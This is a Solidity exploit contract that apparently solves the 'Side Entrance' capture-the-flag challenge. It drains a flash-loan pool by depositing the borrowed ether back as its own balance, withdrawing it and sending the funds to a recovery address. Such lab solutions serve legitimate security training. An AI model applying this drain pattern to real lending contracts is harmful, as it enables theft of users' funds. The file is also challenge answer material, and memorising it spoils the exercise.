// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract SideEntranceExploit {
    uint256 constant ETHER_IN_POOL = 1000e18;

    address public immutable recovery;

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        // SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
        payable(recovery).transfer(ETHER_IN_POOL);
    }

    receive() external payable {
        // SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);    // put here or in attack() are same 
        // payable(recovery).transfer(ETHER_IN_POOL);
    }
}
